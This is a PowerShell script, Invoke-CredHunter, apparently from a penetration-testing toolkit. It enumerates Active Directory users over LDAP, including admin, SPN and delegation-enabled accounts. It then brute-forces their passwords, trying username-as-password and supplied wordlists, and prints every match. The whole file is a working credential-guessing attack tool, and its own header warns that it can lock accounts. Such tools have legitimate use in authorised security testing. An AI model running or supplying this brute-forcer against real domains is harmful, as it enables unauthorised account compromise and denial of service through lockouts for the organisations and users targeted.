############################################################
# Invoke-CredHunter.ps1                                    #
#                                                          #
# Credential bruteforcer based on nishang and PowerView,   #
# thanks to both projects                                  #
#                                                          #
# Test for weak AD credentials on a domain.                #
# This module is not opsec safe and you may lock accounts. #
# When no arguments are supplied, password=username will   #
# be tested.                                               #
#                                                          #
# Dominic Chell, MDSec                                     #
# dominic [at] mdsec.co.uk                                 #
############################################################


function Convert-LDAPProperty {
    # helper to convert specific LDAP property result fields
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            # convert the SID to a string
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            # convert the GUID to a string
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # convert misc com objects
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }
    #New-Object -TypeName PSObject -Property $ObjectProperties
    return $Properties["samaccountname"]
}


function Get-NetDomain {
<#
    .SYNOPSIS

        Returns a given domain object.

    .PARAMETER Domain

        The domain name to query for, defaults to the current domain.

    .EXAMPLE

        PS C:\> Get-NetDomain -Domain testlab.local

    .LINK

        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain
    )

    process {
        if($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}

function Get-DomainSearcher {
<#
    .SYNOPSIS

        Helper used by various functions that takes an ADSpath and
        domain specifier and builds the correct ADSI searcher object.

    .PARAMETER Domain

        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ADSprefix

        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-DomainSearcher -Domain testlab.local

    .EXAMPLE

        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if(!$Domain) {
        $Domain = (Get-NetDomain).name
    }
    else {
        if(!$DomainController) {
            try {
                # if there's no -DomainController specified, try to pull the primary DC
                #   to reflect queries through
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }

    if($ADSpath) {
        if($ADSpath -like "LDAP://*") {
            $ADSpath = $ADSpath.Substring(7)
        }
        $DistinguishedName = $ADSpath
    }
    else {
        $DistinguishedName = "DC=$($Domain.Replace('.', ',DC='))"
    }

    $SearchString = "LDAP://"
    if($DomainController) {
        $SearchString += $DomainController + "/"
    }
    if($ADSprefix) {
        $SearchString += $ADSprefix + ","
    }
    $SearchString += $DistinguishedName
    Write-Verbose "Get-DomainSearcher search string: $SearchString"

    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $Searcher.PageSize = $PageSize
    $Searcher
}

function Invoke-CredHunter {
<#
    .SYNOPSIS

        Find weak credentials for a given set of user accounts or the whole domain. Password = username will always be verified.
        Another -Domain can be specified to query for users across a trust.


    .PARAMETER UserList

        Supply a custom wordlist of users.

    .PARAMETER PasswordList

        Supply a custom wordlist of passwords.

    .PARAMETER CustomPasswords

        A custom CSV list of passwords.

    .PARAMETER DontPrompt

        Disable the warning prompt.

    .PARAMETER UserName

        Username filter string, wildcards accepted.

    .PARAMETER Domain

        The domain to query for users, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER AdminCount

        Switch. Return users with adminCount=1.

    .PARAMETER SPN

        Switch. Only return user objects with non-null service principal names.

    .PARAMETER Unconstrained

        Switch. Return users that have unconstrained delegation.

    .PARAMETER AllowDelegation

        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Invoke-CredHunter -Domain testing

    .EXAMPLE

        PS C:\> Invoke-CredHunter -UserList c:\users.txt"

    .EXAMPLE

        PS C:\> Invoke-CredHunter -CustomPasswords password,Password1

    .EXAMPLE

        PS C:\> Invoke-CredHunter -PasswordList "c:\passwords.txt"

    .EXAMPLE

        PS C:\> Invoke-CredHunter -UserName "*admin*" -CustomPasswords password

    .EXAMPLE

        PS C:\> Invoke-CredHunter -AdminCount
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        
        [String]
        $UserList,

        [String]
        $PasswordList,

        [Array]
        $CustomPasswords,

        [Switch]
        $DontPrompt,

        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        if(!$DontPrompt)
        {
            do{
                $Prompt = Read-host "[*] WARNING: This module is not opsec safe! Be wary of locking accounts`n[*] Do you want to continue?"
                Switch ($Prompt)
                {
                    Y {continue}
                    N {Write-Host "Exiting"; Exit}
                    Default {continue}
                }
            } while($prompt -notmatch "[YN]")
        }
        if(!$UserList)
        {
            # so this isn't repeated if users are passed on the pipeline
            $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
        }
    }

    process {
        $UserArray = @()
        if(!$Domain) {
            $Domain = (Get-NetDomain).name
        }
        if($UserSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            # check if we're using a username filter or not
            if($UserName) {
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }

            $UserSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert/process the LDAP fields for each result
                $u = Convert-LDAPProperty -Properties $_.Properties
                $UserArray += ,$u
            }
        }
        elseif($UserList)
        {
            $UserArray = Get-Content $UserList
        }
        if($PasswordList)
        {
            $PassList = Get-Content $PasswordList
        }
        elseif($CustomPasswords)
        {
            if($CustomPasswords -isnot [system.array]) {
                $CustomPasswords = @($CustomPasswords)
            }
            $PassList = $CustomPasswords
        }
        Write-Output "Brute Forcing Active Directory $Domain"
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        Try
        {
            $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $Domain)
            $success = $true
        }
        Catch
        {
            $message = "Unable to contact Domain"
            $success = $false
        }

        if($success -ne $false)
        {
            :UsernameLoop foreach ($username in $UserArray)
            {
                # check if the password = the username
                Try
                {
                    Write-Verbose "Checking $username : $username"
                    $success = $principalContext.ValidateCredentials($username, $username)
                    $message = "Password Match"
                    if ($success -eq $true)
                    {
                        Write-Output "Match found! $username : $username"
                        if ($StopOnSuccess)
                        {
                            break UsernameLoop
                        }
                    }
                }
                Catch
                {
                    $success = $false
                    $message = "Password doesn't match"
                }
                # check the wordlist
                if ($PassList)
                {
                    foreach ($Password in $PassList)
                    {
                        Try
                        {
                            Write-Verbose "Checking $username : $password"
                            $success = $principalContext.ValidateCredentials($username, $password)
                            $message = "Password Match"
                            if ($success -eq $true)
                            {
                                Write-Output "Match found! $username : $Password"
                                if ($StopOnSuccess)
                                {
                                   break UsernameLoop
                                }
                            }
                        }
                        Catch
                        {
                             $success = $false
                             $message = "Password doesn't match"
                        }
                    } # end password loop
                } # end if passwords
            } # end username loop
        } # end if
    }
}
